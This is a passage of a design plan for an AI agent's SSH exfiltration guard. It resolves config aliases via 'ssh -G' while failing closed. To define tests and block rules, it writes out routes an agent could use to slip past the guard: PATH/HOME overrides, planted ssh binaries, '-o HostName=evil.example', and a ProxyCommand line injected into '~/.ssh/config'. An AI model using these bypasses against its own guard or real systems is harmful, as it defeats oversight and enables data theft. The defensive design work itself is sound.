---
status: proposed
created: 2026-11-27
closed:
tracker: [7f7b02cb-0001-460e-82d0-35e6cdba4486]
---

# Exfiltration guard: resolve SSH config aliases before checking the host allowlist

**Tracker task:** `7f7b02cb-0001-460e-82d0-35e6cdba4486` — "Exfiltration guard: resolve SSH config aliases before checking the host allowlist"
**Release:** the in-development release named by the root `pom.xml` `<version>` (do not pin a number here — it changes every release).

## Motivation

The exfiltration guard permits ssh/scp/sftp/rsync only to hosts named in
`.claude/hooks/exfil-allowlist.txt` (the `[lab-hosts]` section). It matches the
**literal destination token** against that allowlist. But an SSH config alias is
not the host it names: a node whose `~/.ssh/config` defines `Host amd-halo-ci`
with `HostName amd-halo` is, to ssh, a reference to the allowlisted lab host —
yet the guard sees the string `amd-halo-ci`, finds no allowlist entry for it, and
blocks `ssh amd-halo-ci`.

This was reported as harness feedback by the agent on
`project/task-20261029-080142` (PR #781): the alias was the node's standard way
to reach an allowlisted Linux box, and the block prevented that agent from
reproducing a Linux-only CI crash. The guard's intended posture — permissive for
machines the owner controls and has allowlisted — is defeated by an alias that is
only cosmetic indirection to one of those very machines.

The fix is to resolve the destination the way ssh itself does, through
`ssh -G <alias>`, before matching the allowlist, while preserving fail-closed
behaviour: an alias that resolves to a non-allowlisted host, or that jumps/proxies
through one, is still blocked, and an *absent* config chain or a `ssh -G` that
cannot resolve falls back to today's literal match so the change cannot become
more permissive by accident. (Several conditions deliberately *block* rather than
fall back — a config carrying a command-executing directive, a config present but
unreadable/unparseable, a config the same line rewrites, a jump chain that
exhausts its bound, and a `HOME`/`PATH`-overriding or untrusted environment — see
the resolver steps below.)

## Scope

A `.claude/hooks` change only, plus its tests and a short note in the guard's
design doc. Concretely:

1. **`.claude/hooks/lib/exfil_bash_network.py`** — in `_check_ssh_family` (now
   called with the command's captured `env`), resolve each ssh-family destination
   host through `ssh -G` before the existing `_require_lab` allowlist match,
   considering the resolved `hostname`, `proxyjump` and `proxycommand`, subject to
   the env-override refusal (command-scoped *and* set — assigned or exported —
   earlier on the same line, and after a `source`/`.`), the trusted-binary rule
   (never run a path-qualified or non-system `ssh`), the pre-`ssh -G` config scan
   (which locates the per-user config via the passwd home and *blocks* a config
   that can execute commands or that it cannot fully read/parse, rather than
   resolving it), the per-program `-o`/`-F` forwarding contract (nothing
   forwarded for rsync; a jump hop forwards none of the target's `-o`), running
   `ssh -G` in the command's effective working
   directory, and the bounded ProxyJump depth/cycle policy. Fold the `-J`
   jump hops into this same resolve-then-require pass (removing the immediate per-hop
   `_require_lab` call) so a jump-host alias is resolved too. Add `KnownHostsCommand`
   to the refused command-executing `-o` regex. On a resolution failure or a
   genuinely absent config chain, fall back to the current literal match; a config
   found to carry a command-executing directive, or that is present but cannot be
   fully read/parsed, and an unresolved jump hop (depth/cycle/invocation cap), are
   blocked outright.
   **`.claude/hooks/lib/exfil_bash_dispatch.py`** — pass `env` to
   `_check_ssh_family`, and track the names set (assigned or exported) earlier on
   the command line (next to the existing `cd` tracking) on the `BashContext` so
   the step-1 refusal sees `PATH=/tmp; ssh …`, `export HOME=…; ssh …` and
   `source env.sh; ssh …` (see "Preceding HOME/PATH assignments").
2. **A new sibling test module** `.claude/hooks/lib/test_exfiltration_guard_ssh_alias.py`,
   built on the shared `GuardFixture` imported from
   `test_exfiltration_guard_check.py`, covering every case in Success criteria:
   alias-to-allowlisted (allowed), alias-to-non-allowlisted (blocked), ProxyJump to
   a non-allowlisted host (blocked), ProxyCommand alias (blocked), `-J` jump-host
   alias resolving to an allowlisted host (allowed) and to a non-allowlisted host
   (blocked), `-o HostName=` override in both attached and separate spellings and
   `-F`/`-Ffile` (blocked), a relative `-F` after a `cd` (resolved in the
   command's directory), `HOME=`/`PATH=` environment overrides leading, set
   (assigned or exported) earlier on the line, and after a `source`/`.`
   (blocked), a path-qualified ssh executable (not run by the resolver), rsync's
   own `-F`/`-o` switches (not forwarded), a jump hop that does **not** inherit
   the target's `-o HostName=` (so a target override cannot clear a
   non-allowlisted hop), `Match exec`/`ProxyCommand` config detection blocking
   the command — for both a cosmetic alias and an allowlisted-literal token —
   with a sentinel proving no execution, a config that is present but
   unparseable (blocked, not literal fallback), a config the chain writes
   earlier on the same line (blocked), ProxyJump cycle/depth exhaustion
   (blocked), and literal fallback only on resolution failure or an absent
   config chain — each for `ssh`, `scp` and `rsync`-over-ssh.
3. **`docs/internals/exfiltration-guard.md`** — one or two sentences recording
   that ssh-family destinations are resolved through `ssh -G` before the allowlist
   match (the doc currently states only that ssh-family handling lives in
   `exfil_bash_network.py`).

Out of scope (and why):

- The curl/wget URL path, raw-socket tools (`nc`/`socat`/…), probe tools and the
  `git push`/`gh` host checks. None of them resolve a destination through SSH
  config, so alias resolution does not apply; touching them would widen the change
  beyond the task.
- The allowlist file format and its `[lab-hosts]`/`[git-remotes]`/`[ar-servers]`
  sections. Unchanged — aliases are resolved *to* hosts that are then matched by
  the existing `Allowlist.is_lab_host`.

## Approach

### Where the behaviour belongs

`_check_ssh_family(prog, argv, ctx)` in `exfil_bash_network.py` is the single place
that turns an ssh/scp/sftp/rsync command into a list of destination hosts and
calls `_require_lab(host, prog, ctx)` on each. The alias resolution belongs here,
as a transform applied to each collected host immediately before `_require_lab`.
`_require_lab` and `Allowlist.is_lab_host` stay exactly as they are — they keep
deciding whether a *hostname* is allowlisted; the new step only changes what
hostname they are asked about.

The guard already shells out to a trusted binary (the `Git` wrapper runs
`subprocess.run(["git", …])` with a timeout and converts every failure to a
block). The alias resolver follows the same shape with `ssh -G`.

### The resolver

Add a module-private helper, resolving one destination token:

```
def _resolve_ssh_destination(token, options, env, prog, ctx) -> list[str]:
    """Hosts the allowlist must clear for this destination: the resolved
    HostName plus any ProxyJump hop, or [token] unchanged if ssh -G cannot
    be run safely or cannot resolve it."""
```

Behaviour, in order:

1. **Refuse a config/binary-selecting command-scoped environment override
   (thread #2).** `_check_ssh_family` is now called with the command's captured
   leading `VAR=value` assignments (`env`, see "Command-scoped environment"
   below). Before any resolution, if `env` assigns `HOME` or `PATH`, raise a
   block. `PATH` changes *which* `ssh` binary the shell runs, so running
   `ssh -G` under the hook's own `PATH` (or under an attacker-chosen `PATH`)
   would resolve through a different program than the real command — the latter
   being exactly the command-execution path thread #3 closes. `HOME` is refused
   as belt-and-braces: OpenSSH does **not** read the per-user config from
   `$HOME` — it builds the path from the passwd-database home directory and
   expands `~` the same way (step 3) — so a command-scoped `HOME=` does not in
   fact redirect ssh's config, but a non-standard build or a `~`-dependent code
   path could, and refusing it costs nothing. Fail closed: refuse rather than
   resolve. (This mirrors the existing refusal of rsync transport env.) The
   same refusal applies when `HOME` or `PATH` was **set earlier on the same
   command line** — assigned (`PATH=/tmp; ssh amd-halo`) or exported
   (`export HOME=/tmp/evil; ssh amd-halo`) — see "Preceding HOME/PATH
   assignments" below; the leading-assignment capture alone cannot see those
   forms. This is a one-time gate on the original command, evaluated before the
   first resolution, not a per-hop check.
2. **Locate a trusted ssh, and only ever run that one.** The dispatcher picks the
   ssh-family branch from `os.path.basename(argv[0])`, so `/tmp/ssh amd-halo` or
   `./ssh amd-halo` reaches `_check_ssh_family` even though the program that will
   run is not the `ssh` on `PATH`. The resolver therefore:
   - when `argv[0]` is path-qualified (contains `/`), does **not** resolve and
     returns `[token]` (literal fallback). It must never execute the named file:
     running an assistant-chosen `/tmp/ssh -G` would itself be the command
     execution step 3 exists to prevent, and resolving through the system `ssh`
     instead would base the decision on a different program than the one allowed.
     (That a path-qualified ssh-family program is not scanned at all today is a
     pre-existing gap, tracked separately as tracker task
     `dfed2140-25dc-4290-b718-b41d0561236b`.)
   - otherwise locates `ssh` with `shutil.which("ssh")` and requires its
     `os.path.realpath` to lie under the dispatcher's `SYSTEM_PREFIXES`
     (`exfil_bash_dispatch.py`, the same trust rule `_check_program_file` uses).
     If ssh is absent, or resolves outside those prefixes (an assistant-writable
     `~/bin/ssh` early on the profile's `PATH`), return `[token]` (literal
     fallback) — the resolver never executes a non-system ssh.
   scp and sftp start ssh from a compiled-in path rather than `PATH`, so for them
   the resolver's ssh may not be byte-for-byte the program they spawn; it reads
   the same config chain (step 3), which is what decides the resolved host, so
   the reported hostname is the same.

   **Known gap — the family executable the command will run is not itself
   validated.** The trusted-ssh rule above
   governs only the `ssh` the *resolver* runs for `ssh -G`; it does not validate
   the `ssh`/`scp`/`sftp`/`rsync` the *shell* will run. When the resolver
   refuses to run a non-system ssh and falls back to the literal match, an
   otherwise-allowlisted destination (`ssh amd-halo`) is still **allowed** even
   though the `ssh` first on `PATH` may be an assistant-writable binary that
   sends data anywhere. This is **not a regression** — it is exactly today's
   behaviour on the base branch, where the guard always literal-matches and
   never inspects which ssh-family binary `PATH` selects — and it is independent
   of alias resolution, so this plan does not change it. Making it fail closed
   (validating the family executable against `SYSTEM_PREFIXES` and blocking an
   untrusted one, rather than literal-matching) is a separate, broader guard
   change tracked as task `8a5be352-003a-4c2c-955d-5e913f4ca625` (the bare-name
   case) and `dfed2140-25dc-4290-b718-b41d0561236b` (the path-qualified case);
   whether to fold it into this change is an Open question for the approver.
   The prose under "Why this is not a new exfiltration vector" is scoped
   accordingly — it claims only that resolution adds no *new* vector, not that
   it closes this pre-existing one.
3. **Refuse to run `ssh -G` on a config that can execute a command during
   resolution (thread #3 — the `Match exec` mitigation).** `ssh -G` evaluates
   `Match exec "<command>"` and runs `ProxyCommand`/`LocalCommand`/
   `KnownHostsCommand` references while it builds the effective config, and
   there is no `ssh -G` flag that evaluates `Match` without its `exec`
   predicate. So before invoking `ssh -G`, statically scan the effective config
   text — the per-user `~/.ssh/config`, the system `/etc/ssh/ssh_config`,
   any `-F <file>` named on the command line, and every file reachable through
   their `Include` directives (follow includes — absolute paths and ones
   relative to `~/.ssh` or `/etc/ssh` alike — to a bounded depth, expanding
   `~` and globs) — for any command-executing directive. **The per-user config
   must be located exactly as OpenSSH locates it: from the passwd-database home
   directory (`pwd.getpwuid(os.getuid()).pw_dir`), not from `$HOME`, and `~`
   must expand to that same passwd home.** OpenSSH builds the default user
   config path and performs `~` expansion through `getpwuid(getuid())`, so the
   `ssh -G` the resolver spawns reads `<pw_dir>/.ssh/config` regardless of what
   `$HOME` the hook (or the command) sets. If the scan followed `$HOME` while
   `ssh -G` read `pw_dir`, a sandbox or an inherited `HOME` that differs from
   `pw_dir` would make the scan read one file while ssh reads another — the
   scan could miss a `Match exec` that `ssh -G` then honours. Reading `pw_dir`
   keeps the scanned file and the file `ssh -G` reads identical; the step-1
   `HOME=` refusal is belt-and-braces on top of this, not what makes the two
   match. If `getpwuid(getuid())` cannot be resolved (no passwd entry for the
   uid), the scan cannot prove where ssh will read its config, so it blocks
   (fail closed) rather than guessing from `$HOME`. Other paths are resolved the
   way ssh resolves them, not relative to the hook process: a relative `-F` path
   is relative to the **command's effective working directory**
   (`ctx.command_cwd`, which already tracks a `cd` earlier on the line; when it is
   unknown, `ctx.require_cwd` blocks, as it does for every other cwd-dependent
   check), while a relative `Include` path is relative to `~/.ssh` when it appears
   in a user config (including a `-F` file) and to `/etc/ssh` when it appears in
   the system config — per `ssh_config(5)`, *not* relative to the cwd.
   OpenSSH additionally expands `%`-tokens (for example `%d` for the home
   directory) and `${ENV}` environment references in `Include` and `-F` paths —
   both keywords are in `ssh_config(5)`'s token and environment-variable lists —
   which the static scanner does **not** reproduce. An `Include`/`-F` path
   carrying a `%`-token or a `${…}` reference is therefore treated as content
   uncertainty and **blocks** (the second scan outcome below); it must not be
   mistaken for a glob that matched nothing and fall through to literal
   fallback, which would let an allowlisted-literal token slip past a config
   file the scanner could not locate. The
   directives are: `Match exec`,
   `ProxyCommand` (not `none`), `LocalCommand`, `PermitLocalCommand yes` and
   `KnownHostsCommand`. The scan has three outcomes — a detected directive
   blocks, any content uncertainty blocks, and only a genuinely absent config
   chain falls back to the literal match — because returning `[token]` is
   **not** safe unless the chain is proven to hold nothing:
   - **A command-executing directive is detected in a readable config → raise a
     block.** Returning `[token]` here would be a bypass: if the destination
     token is itself an allowlisted name (`ssh amd-halo` with a `Match exec` or
     `ProxyCommand` in `~/.ssh/config`), literal fallback makes `_require_lab`
     succeed and the command is *allowed* while its config still carries the
     execution/routing directive the real `ssh` would honour. So a detected
     directive fails closed by blocking outright, independent of whether the
     token is itself allowlisted.
   - **A reachable config file exists but cannot be fully read or confidently
     parsed → raise a block.** This is the fail-closed correction to an earlier
     draft, which lumped all scan-incompleteness into literal fallback. A file
     that is present but unreadable, or readable but whose grammar the scanner
     cannot classify, or an `Include` that resolves to an existing file the
     scanner cannot follow (including an `Include` chain deeper than the
     scanner's bounded follow depth, or an `Include`/`-F` path the scanner
     cannot expand because it carries a `%`-token or `${ENV}` reference),
     *may* carry a `Match exec`/`ProxyCommand` the scan
     did not see; returning `[token]` would then allow an allowlisted-literal
     token (`ssh amd-halo`) to slip through `_require_lab` while the real ssh
     honours the hidden directive. So any uncertainty about the **content** of a
     file that is actually part of the chain fails closed: block, run no
     `ssh -G`. (A test exercises this path with a config the scanner cannot
     parse.)
   - **The config chain is genuinely absent → literal fallback.** When there is
     nothing to scan — no per-user config, no system config, no `-F` file, and
     no `Include` resolves to any existing file — nothing dangerous can be
     present. This is the ordinary machine with no SSH config, and it is the
     only scan outcome that falls back to the literal match (`ssh -G` would
     itself report the literal token here). An `Include` glob that matches no
     file is an absence, not a parse failure, and stays on this branch.
   The scan executes nothing; it only reads text. `ssh -G` is therefore only
   ever invoked on a config proven free of command-execution directives *at scan
   time*, so resolution never runs an assistant-controlled command, and a config
   that *does* carry one is **blocked**, never silently allowed through literal
   fallback. This is the decisive mitigation the task requires: **no `ssh -G` on
   configs that can execute commands, and no allow of a config that can.** The
   "at scan time" qualifier matters when an earlier command on the same line
   rewrites the config the real ssh then reads — see "Config-chain modification
   earlier on the line" below.
4. **Run `ssh -G <forwarded-options> <alias-without-user@-or-:port>`** with a
   short timeout and captured output, mirroring the `Git.run` error handling:
   any `OSError`/`SubprocessError`/timeout, or a non-zero exit, returns
   `[token]` (literal fallback). The subprocess runs with `cwd=ctx.command_cwd`,
   so `cd /tmp; ssh -F config amd-halo-ci` resolves `/tmp/config` — the file the
   real ssh reads and the file step 3 scanned — not a `config` next to the hook
   process. The forwarded options are exactly the set
   pinned under "Faithful resolution" below (`-F` and the host/config-selecting
   `-o` values); the routing and command-executing `-o` forms are already
   refused before resolution, so they never reach this call.
5. **Parse** the `key value` lines of the output (ssh prints keys lowercased,
   one per line) and **validate the schema strictly**. Read `hostname`,
   `proxyjump`, `proxycommand`. A successful `ssh -G` prints exactly one
   `hostname` line; a zero-exit output that is **missing** the `hostname` line,
   or carries a **duplicate** or **malformed** `hostname`/`proxyjump`/
   `proxycommand`, or that the parser otherwise cannot classify, is **not** a
   trustworthy resolution and **blocks**. It is not treated as a resolution
   failure that falls back to the literal match: literal fallback (step 4) is
   reserved for the launch-failure and non-zero-exit cases, where the resolver
   got *no* answer at all. A zero-exit answer the resolver cannot trust fails
   closed, because returning `[token]` on a malformed answer would clear an
   allowlisted literal that the resolver never actually resolved.
6. **ProxyCommand from the resolved config.** If `proxycommand` is present and
   not `none`, the session is routed through an arbitrary command whose
   destination cannot be verified — raise a block, exactly as the existing
   command-line `-o ProxyCommand` check does. (In practice step 3 has already
   blocked such a config when it scanned it, but this is a belt-and-braces check
   on the resolved output.)
7. **ProxyJump hops, with an explicit depth/cycle policy (thread #4).** If
   `proxyjump` is present and not `none`, each hop must itself be allowlisted.
   Resolve hops iteratively, not by open recursion, bounded by two named
   constants and a visited set so a cyclic config (`Host a ProxyJump b` /
   `Host b ProxyJump a`) cannot spin:
   - `_MAX_PROXYJUMP_DEPTH` (default 10) caps how many hop levels are followed.
   - `_MAX_SSH_RESOLUTIONS` (default 16) caps the total number of `ssh -G`
     invocations across one top-level destination (primary alias + all hops).
   - A `visited` set of hop specs (normalised) is carried; a hop already in
     `visited` is not resolved again (cycle break).
   Each hop is resolved by the same steps 2–6 (same trusted ssh, same config
   scan, same `ssh -G` in the same cwd; the step-1 environment refusal has
   already been applied once to the whole command), **but with a hop-specific,
   OpenSSH-faithful option set — not the target's `-o` options.** OpenSSH builds the implicit jump connection from the jump host's own
   config entry; it does **not** forward the target's `-o HostName=…` (or other
   target host-selecting `-o`) to the hop. Reusing the target's options would
   let `ssh -o HostName=amd-halo evil-jump` (target overridden to an allowlisted
   name) resolve the *hop* `evil-jump` as though it were `amd-halo`, hiding a
   non-allowlisted jump. So a hop is resolved with `ssh -G <hop>` carrying only
   the options OpenSSH applies to the jump connection — the shared `-F`
   config-file selector (which governs the whole invocation) — and **none** of
   the target's `-o` host-selecting values. The hop's `hostname` comes from its
   own resolved config, and that resolved `hostname` is added to the returned
   list so `_require_lab` checks it. When the depth cap, the invocation cap, or
   a cycle is hit, **raise a block**: the hop could not be
   fully resolved, so the real SSH route runs through an unverified chain, and
   treating the unresolved hop as a literal would wrongly clear it whenever that
   literal token happens to be allowlisted even though the chain beyond it is
   unknown. Blocking is fail closed and bounds the work — never literal-match an
   unresolved hop.
8. **Return** `[resolved_hostname] + resolved_hop_hosts`.

Then in `_check_ssh_family`, replace the final

```
for host in hosts:
    _require_lab(host, prog, ctx)
```

with a pass that expands each host through `_resolve_ssh_destination` and calls
`_require_lab` on every resolved host. `_check_ssh_family` now takes the command's
captured `env` (the leading `VAR=value` assignments) and forwards it to the resolver
for the step-1 override refusal; the dispatcher already has `env` in hand from
`unwrap_with_env` and simply passes it through (`_check_ssh_family(prog, argv, env,
ctx)`). The returned audit string should report the hosts actually checked.

**The `-J` jump hops join this same pass (thread #1 follow-up — the `-J`
contradiction).** Today the option loop calls `_require_lab(hop, …)` on each `-J`
value **immediately**, before the final host loop. If only the final loop were
replaced, `ssh -J amd-halo-ci amd-halo` would reject the jump-host alias
`amd-halo-ci` against the literal allowlist *before* `_resolve_ssh_destination`
could expand it — contradicting the next sentence here and the success criterion
that jump-host aliases resolve. So the `-J` hops are **no longer matched in the
option loop**: that immediate `_require_lab` call is removed, and each `-J` hop
(split on `,`, in command-line order) is collected into the same destination list
as the positional host(s) and expanded through `_resolve_ssh_destination` — which
itself follows that hop's own `ProxyJump` chain under the step-7 depth/cycle bound —
then matched by `_require_lab`. Every ssh destination the command names — the
positional host, an `-o HostName=`-resolved host, a `-J` jump hop, and any
`ProxyJump` hop — therefore reaches `_require_lab` only *after* resolution, through
one uniform resolve-then-require pass. (The option loop keeps its *rejections*: a
command-executing `-o` form, `scp -S`, and the rsync transport flags are still
refused inline before any resolution.)

### Failure-mode contract at a glance

The resolver has exactly two non-allow outcomes, and the rule distinguishing them
is a single principle: **block whenever something dangerous is present or might be
present, and fall back to the literal match only when nothing dangerous can be
proven present** (so the guard is never more permissive than today's base branch).
Every condition the steps above define maps to one of the two outcomes; this table
consolidates them so the contract can be audited in one place rather than
reconstructed from the prose.

| Condition | Outcome | Where |
| --- | --- | --- |
| `HOME`/`PATH` set or unset for the command — leading, earlier on the line, or via `source`/`.` (incl. `env -i`/`-u`, `unset HOME`/`PATH`) | **Block** | Step 1 |
| Command-executing `-o` (`ProxyCommand`/`ProxyJump`/`LocalCommand`/`PermitLocalCommand`/`KnownHostsCommand`), `scp -S`, rsync transport flags | **Block** (before resolution) | Faithful resolution |
| Config-source `-o` key (`Include`) that adds an unscanned config file | **Block** (before resolution) | Faithful resolution |
| Command-executing directive detected in a readable config | **Block** | Step 3 |
| Reachable config present but unreadable/unparseable, or an un-followable / token / `${ENV}` / over-depth `Include` | **Block** | Step 3 |
| Config chain written earlier on the same line — incl. an absolute-`Include` target and a config-writing command substitution (TOCTOU) | **Block** | Config-chain modification |
| `getpwuid(getuid())` unresolvable, or a relative `-F`/config path with unknown cwd | **Block** | Steps 3-4 (`require_cwd`) |
| `ssh -G` zero-exit but output missing/duplicate/malformed `hostname`/`proxyjump`/`proxycommand` | **Block** | Step 5 |
| Resolved `hostname` not allowlisted, resolved `proxycommand` ≠ `none`, or a resolved `proxyjump` hop not allowlisted | **Block** | Steps 6-7 |
| ProxyJump depth cap, invocation cap, or cycle exhausted | **Block** | Step 7 |
| `argv[0]` path-qualified, or the resolver's `ssh` absent / outside `SYSTEM_PREFIXES` | **Literal fallback** | Step 2 |
| `ssh -G` fails — `OSError`/`SubprocessError`/timeout/non-zero exit | **Literal fallback** | Step 4 |
| Config chain genuinely absent (no user/system config, no `-F`, `Include` glob matches nothing) | **Literal fallback** | Step 3 |
| rsync daemon-mode (`host::module`) or `rsync://` destination (no ssh) | **Literal fallback** (never resolved) | Faithful resolution |

"Literal fallback" is not an allow: it hands the original token to `_require_lab`,
which still blocks a non-allowlisted literal. It is permissive only in the sense
that it reproduces the base branch's decision for that destination, which is the
most the guard can do without resolution it could not safely perform.

### Command-scoped environment (thread #2)

`unwrap_with_env(argv)` strips the leading `VAR=value` assignments off the command
and returns them separately; today `_check_ssh_family` is called without them, so
`HOME=/tmp/evil ssh amd-halo` or `PATH=/tmp ssh amd-halo` reaches the check with
those assignments invisible. For alias resolution this matters: the real `ssh` runs
under the overridden environment, so `PATH=/tmp` makes it an attacker `ssh` on the
front of `PATH`, while a `ssh -G` the resolver ran under the hook's own `PATH`
would resolve through a different program entirely. (`HOME` does not redirect which
config `ssh` reads — OpenSSH locates it via the passwd home, step 3 — but it is
refused too, as belt-and-braces.)

Decision: forward `env` into `_check_ssh_family`, and in resolver step 1 **refuse**
(block) when `env` assigns `HOME` or `PATH`. This is the fail-closed
choice: the guard does not try to reproduce an arbitrary overridden environment, and
it never runs `ssh -G` under an attacker-chosen `PATH`/`HOME` (which would be exactly
the command-execution path thread #3 closes). The refusal is symmetric with the
existing rsync transport-env refusal in `_check_ssh_family`/the dispatcher. Other
assignments (`LANG`, `TERM`, a `SendEnv`/`SetEnv`-style variable that only reaches
the *remote*, …) do not affect local binary or config selection and are left alone.
`env -i` / `env -u PATH` / `env -u HOME` wrapper forms clear or unset those
variables without an assignment, changing which binary or config applies just as an
assignment would, so the dispatcher treats those `env` flag forms as overrides too
(block), not only the `VAR=value` forms `unwrap_with_env` captures. This needs an
explicit extension of the wrapper contract, because today the stripping loses the
signal: `_env_option_end` skips `env -i` as an ordinary flag and consumes the
variable after `env -u` (so `env -u PATH ssh …` hands back `ssh …` with an empty
`env`), and neither fact reaches `_check_ssh_family`. So `unwrap_with_env` /
`_env_option_end` must surface an override marker the resolver's step-1 gate reads
whenever the `env` wrapper carries `-i` / `--ignore-environment`, or a `-u` /
`--unset` of `HOME` or `PATH` — in every spelling `_env_option_end` already parses
(separate, attached, `=`-joined, and long-prefix). The marker rides alongside `env`
on the `BashContext`, and step 1 blocks on it exactly as on an assigned
`HOME`/`PATH`. Regression tests cover `env -i ssh amd-halo`, `env -u PATH ssh
amd-halo` and `env -u HOME ssh amd-halo` (all blocked).

### Preceding HOME/PATH assignments (review follow-up)

The leading-assignment capture does not see `HOME`/`PATH` set by an earlier
simple command on the same line. Two forms matter, and both reach
`_check_ssh_family` with an empty `env` while the real ssh runs under the changed
value:

- **A plain assignment:** `PATH=/tmp; ssh amd-halo` or `HOME=/tmp/evil; ssh
  amd-halo`. A bare `PATH=/tmp` assignment changes the shell's own command
  lookup for the rest of the line, so the later `ssh` is found in `/tmp` — the
  value need not be *exported* to redirect which binary runs. `HOME` likewise
  persists as a shell variable.
- **An export:** `export HOME=/tmp/evil; ssh amd-halo` or `export PATH=/tmp; ssh
  amd-halo`. `_check_exported_env` in `exfil_bash_dispatch.py` refuses only git
  repository-selecting/transport variables, rsync transport variables and
  `TAR_OPTIONS` at the export; `HOME` and `PATH` exports are allowed (its own
  error text even suggests `export PATH=$PATH:/x`), and `set -a`/`set -o
  allexport` is already refused outright.

Decision: do **not** refuse these assignments/exports at the point they occur —
that would block common, harmless lines that never run ssh. Instead, track the
names **assigned or exported** so far through the command list, the same way the
dispatcher's command loop in `exfil_bash_dispatch.py` already tracks the
effective directory through a `cd` (including restoring it when a `( … )`
subshell closes), and carry them on the `BashContext` handed to
`_check_simple_command` (as `ctx.at(cwd)` carries the directory today). A
preceding simple command whose assignment prefix, or whose `export`/`declare
-x`/`typeset -x` operands, name `HOME` or `PATH` adds that name. An `unset HOME`/
`unset PATH` (and `export -n HOME`/`export -n PATH`) **also adds** the name:
clearing the variable changes the command environment the real ssh inherits and
the shell's own command lookup (an unset `PATH` makes the shell search a built-in
default path), while the resolver still runs under the hook's `PATH`/`HOME`, so a
clear is an override in exactly the way an assignment is. Removing a name from the
set is never required — keeping it is the fail-closed direction — so neither
`unset` nor `export -n` ever *clears* a tracked name; they only ever add. When
`HOME` or `PATH` is in that set at an ssh-family command, step 1 blocks, exactly
as for a leading assignment. A substitution body, which is analysed after the
list, is analysed with the set treated as "unknown", i.e. as if both were set —
the analogue of the existing `ctx.at(None)` rule for a line that changes
directory.

**`source`/`.` fails closed.** A sourced file can assign or
export `HOME`/`PATH` where the dispatcher cannot see it, so a `source <file>` (or
`. <file>`) anywhere earlier on the line is treated as having set **both** names
— the same "unknown ⇒ as if set" rule as a substitution body. Any ssh-family
command after a `source`/`.` on the same line is therefore blocked by step 1.
This is the simple fail-closed answer the reviewer asked for and it carries a
regression test; it is no longer an open question. (If a sourced file provably
touches neither name the block is conservative, but a `source; ssh` on one line
is rare and the safe direction is to refuse it rather than parse arbitrary
sourced files.)

Scope of the tracking: one Bash tool call. Shell state other than the working
directory does not persist between Bash tool calls, so an assignment or export
cannot reach an ssh in a later call.

### Config-chain modification earlier on the line

The static scan proves a config free of command-executing directives *at the
moment it reads it* — but the hook analyses the whole shell line before any
command on it runs, so a command earlier on the line can rewrite a file in the
reachable config chain after the scan and before the real ssh reads it:
`printf 'ProxyCommand touch /tmp/pwned\n' > ~/.ssh/config; ssh amd-halo`. The
scan reads the old (clean) config, authorises `ssh -G`, and `_require_lab`
clears the allowlisted literal, yet the real ssh reads the rewritten file and
honours the injected directive. This defeats step 3's stated guarantee that no
*allowed* command keeps a command-executing config.

Decision: a write to the reachable config chain earlier on the same line
poisons the scan, so it fails closed. Tracked the same way as the `cd` and the
assignment/export set — one Bash tool call, carried on `BashContext` — the
dispatcher marks the config chain "possibly modified" when an earlier command on
the line could write into it: a redirection (`>`/`>>`) whose target, or a
`cp`/`mv`/`tee`/`install`/`dd of=` destination, resolves (in `ctx.command_cwd`,
expanding `~` via the passwd home) to a path **in the reachable config chain**.
That chain is the *full* set the static scan resolves, **not only** the three
default locations: besides `~/.ssh/config`, `/etc/ssh/ssh_config` and a named
`-F` path, it includes every file reached through an `Include` directive,
**wherever it points**. An absolute `Include /tmp/extra.conf` makes
`/tmp/extra.conf` part of the chain, so `printf 'ProxyCommand …' > /tmp/extra.conf;
ssh -F /tmp/base.conf amd-halo` must poison the scan too. A write to a path the
scan has not yet established as part of the chain, but that an `Include` *pattern*
already read could later match (an `Include /tmp/*.conf` with a write that creates
`/tmp/new.conf`), is also a possible modification: the poison set is every path
the scanned `Include` directives name or glob, **including currently-absent
targets**. When the mark is set — or when a write target cannot be determined (an
unparsed redirection, a variable path) — the ssh-family command blocks rather than
scanning or resolving.

**A command substitution is evaluated for the same poison, before the ssh check.**
A substitution body runs before the command that contains it, yet the dispatcher
analyses it after the simple-command list, so `: "$(printf 'ProxyCommand …' >
~/.ssh/config)"; ssh amd-halo` would otherwise scan the old config before the
substitution is visited. The config-chain-modified mark is therefore set from a
substitution body that could write into the chain exactly as from a plain command;
and — matching the "unknown ⇒ as if set" rule already used for the `HOME`/`PATH`
set and the `ctx.at(None)` cwd rule — any substitution earlier on a line that then
runs an ssh-family command, whose write target cannot be *proven* outside the
chain, poisons the scan (block).

This is conservative: it refuses the rare `write-config; ssh` one-liner rather than
trusting a scan the same line can invalidate. Regression tests exercise both
`printf … > ~/.ssh/config; ssh amd-halo`, the absolute-`Include`-target write, and
the command-substitution form (all blocked, no sentinel). Residual limits — a
*concurrent* writer that races the scan and the `ssh -G` reread, which single-line
analysis cannot see — are noted in Open questions.

### Faithful resolution and its options (thread #1 — the exact forwarding contract)

`ssh -G` honours the same config-selecting options the real command would, so the
resolver must pass through the ssh options that select which host config applies,
while never passing through an option that could itself route the session or execute
a command. `_ssh_positionals(argv, _SSH_VALUE_FLAGS)` already collects the option
pairs as `(flag, value)` in both the separate (`-o HostName=x`) and attached
(`-oHostName=x`, which `_ssh_positionals` splits into `("-o", "HostName=x")`)
spellings, and `-F file` / `-Ffile` likewise. The contract is therefore stated over
those normalised pairs:

**Forwarded to `ssh -G` (verbatim, both spellings):**

- `-F <configfile>` — the config file selector. Forwarded as `-F <value>`.
- Every `-o <key>=<value>` whose `<key>` is **not** in the rejected set below.
  This deliberately forwards *all* host/config-selecting keys — `HostName`,
  `Port`, `User`, `HostKeyAlias`, `CanonicalizeHostname`, `CanonicalDomains`, and
  any other — rather than an allow-enumerated subset, because under-forwarding is
  the risk: dropping `-o HostName=` reopens the `ssh -o HostName=evil.example
  amd-halo` hole (the guard would resolve `amd-halo` while the real ssh connects to
  `evil.example`). Forwarding a non-routing `-o` to `ssh -G` can only change the
  *reported* effective config, which is precisely what the guard must see.

  **Exception — a config-source-adding `-o` key is refused, not forwarded.** The
  "can only change the reported config" argument holds for host/config-*selecting*
  keys; it fails for a key that adds a configuration-file *source* `ssh -G` would
  read but the static scan (step 3) never inspected — forwarding that would
  reintroduce the `Match exec`/command-directive gap through a file the scan could
  not see. The config-source keyword is `Include`. Current OpenSSH rejects
  `Include` supplied as a command-line `-o` ("Include directive not supported as a
  command-line option"), so such a command already fails before the guard; but the
  resolver refuses an `-o Include=…` (case-insensitive, both spellings) before
  resolution regardless, so the contract does not rely on that OpenSSH behaviour,
  and any future file-adding `-o` key joins this refused set. A refused
  config-source `-o` blocks, like a routing `-o`.

**Rejected before resolution (raise a block; never forwarded) — case-insensitive,
